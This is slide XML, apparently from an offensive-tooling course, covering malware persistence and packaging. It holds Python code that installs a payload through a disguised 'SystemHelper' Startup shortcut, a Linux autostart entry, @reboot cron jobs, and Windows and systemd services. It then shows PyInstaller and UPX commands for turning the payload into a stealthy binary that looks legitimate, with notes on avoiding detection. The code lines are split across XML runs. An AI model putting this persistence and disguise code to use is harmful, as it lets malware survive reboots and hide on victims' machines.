              <a:t>Like leaving hidden doors in a building:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Scheduled Task = Door that opens on schedule</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Startup Script = Door that opens at entry</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Registry = Hidden switch</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Service = Permanent employee</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Methods:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Startup Script - All platforms</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Cron/Scheduled Task - Linux/Windows</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Registry Entry - Windows only</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Service - All platforms</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Autostart - Linux/Windows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4.3.2  Startup Script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STARTUP SCRIPT PERSISTENCE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def add_startup_script(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if self.platform == 'Windows':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Windows Startup folder</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>startup_path = os.path.join(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>os.environ['APPDATA'],</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'Microsoft', 'Windows',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'Start Menu', 'Programs', 'Startup'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>shortcut_path = os.path.join(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>startup_path, 'SystemHelper.lnk'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import winshell</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>winshell.CreateShortcut(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>shortcut_path,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>target=self.payload_path</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>else:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Linux: .desktop file</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>desktop_path = os.path.join(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>os.path.expanduser('~'),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'.config', 'autostart',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'system-helper.desktop'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>content = f"""</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[Desktop Entry]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Type=Application</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Exec={self.payload_path}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Hidden=false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4.3.3  Cron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80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CRON PERSISTENCE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def add_cron_job(self, schedule='@reboot'):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Get current crontab</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>current_cron = self._run_command('crontab -l')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Build cron entry</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cron_entry = f"{schedule} {self.payload_path} &gt;</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>/dev/null 2&gt;&amp;1"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Check if already exists</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if cron_entry in current_cron:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Add to crontab</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>new_cron = current_cron + "\n" + cron_entry + "\n"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Install</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>process = subprocess.Popen(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>['crontab', '-'],</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>stdin=subprocess.PIPE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>process.communicate(new_cron.encode())</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Common schedules:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># @reboot - Run at boot</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># @daily - Run daily</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># @hourly - Run hourly</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># * * * * * - Run every minute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4.3.4  Service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SERVICE PERSISTENCE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def add_service(self, service_name='SystemHelper'):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if self.platform == 'Windows':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Windows service</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>command = (</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>f'sc create "{service_name}" '</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>f'binPath= "{self.payload_path}" '</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>f'start= auto'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self._run_command(command)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>else:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Linux systemd service</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>service_path = (</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>f'/etc/systemd/system/{service_name}.service'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>content = f"""</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[Unit]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Description=System Helper Service</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>After=network.target</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[Service]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Type=simple</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>ExecStart={self.payload_path}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Restart=always</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>RestartSec=30</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[Install]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>WantedBy=multi-user.target</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"""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4.4.1  Packaging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PACKAGING CONCEPT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like preparing a covert operation package:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Python Script = Mission plan (readable)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Packaged Executable = Locked, sealed envelope</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Dependencies = Equipment needed</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Deployment = Delivering the package</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Why we package:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• No Python required on target</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Code protection (obfuscated)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Single file deployment</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Stealth (appears as legitimate binary)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4.4.2  PyInstaller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PYINSTALLER</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Install</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pip install pyinstaller</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Basic packaging</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pyinstaller --onefile script.py</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># With options</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pyinstaller --onefile \</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>--windowed \</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>--name AppName \</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>--icon app.ico \</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>script.py</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Spec file for advanced control</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pyinstaller --specpath ./specs script.py</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Edit the spec file, then:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pyinstaller script.spec</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Excluding modules</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pyinstaller --onefile \</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>--exclude tkinter \</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>--exclude test \</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>script.py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4.4.3  Packaging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PACKAGING CODE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class PackageBuilder:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def build_pyinstaller(self, script_path, config):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>output_name = config.get('name',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>os.path.basename(script_path).replace('.py',''))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cmd = [</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'pyinstaller',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'--onefile',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'--distpath', self.dist_dir,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'--workpath', self.build_dir,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'--name', output_name</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if not config.get('console', True):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cmd.append('--windowed')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if config.get('icon'):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cmd.extend(['--icon', config['icon']])</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if config.get('hidden_imports'):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for imp in config['hidden_imports']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cmd.extend(['--hidden-import', imp])</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cmd.append(script_path)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>subprocess.run(cmd, check=True)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return os.path.join(self.dist_dir, output_name)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4.4.4  UPX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ourier New"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>UPX COMPRESSION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Install UPX</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sudo apt install upx          # Linux</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>brew install upx               # macOS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Download for Windows</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Usage with PyInstaller</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pyinstaller --onefile --upx-dir /usr/bin script.py</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Or compress after building</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>upx --best --brute output.exe</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Results:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Original size: 8.5 MB</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># After UPX: 3.2 MB (-62%)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Detection considerations:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># UPX compression can be a detection signature</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Use with caution in stealth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